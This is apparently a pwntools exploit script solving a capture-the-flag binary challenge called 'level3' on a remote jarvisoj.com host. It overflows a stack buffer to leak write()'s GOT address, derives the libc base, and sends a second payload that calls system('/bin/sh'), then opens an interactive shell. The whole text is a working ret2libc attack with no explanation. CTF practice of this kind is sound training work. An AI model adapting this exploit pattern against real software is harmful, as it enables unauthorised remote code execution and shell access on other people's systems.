from pwn import *
from LibcSearcher import LibcSearcher

conn = remote("pwn2.jarvisoj.com"," 9879")
elf = ELF('./level3')

write_plt = elf.plt['write']
write_got = elf.got['write']
vul_addr  = elf.symbols['vulnerable_function']

payload1 = 140 * 'a'  +  p32(write_plt)  + p32(vul_addr) + p32(0x01)  + p32(write_got) + p32(0x4)

conn.recvuntil('Input:\n')
conn.sendline(payload1)

write_addr = u32(conn.recv(4))

libc = ELF('./libc-2.19.so')
offset = write_addr - libc.symbols['write']
system_addr = offset + libc.symbols['system']
bin_sh = offset + libc.search('/bin/sh').next()

payload2 = 140 * 'a'  +  p32(system_addr)  + p32(0xdeadbeef) + p32(bin_sh)

conn.recvuntil('Input:\n')
conn.sendline(payload2)

conn.interactive()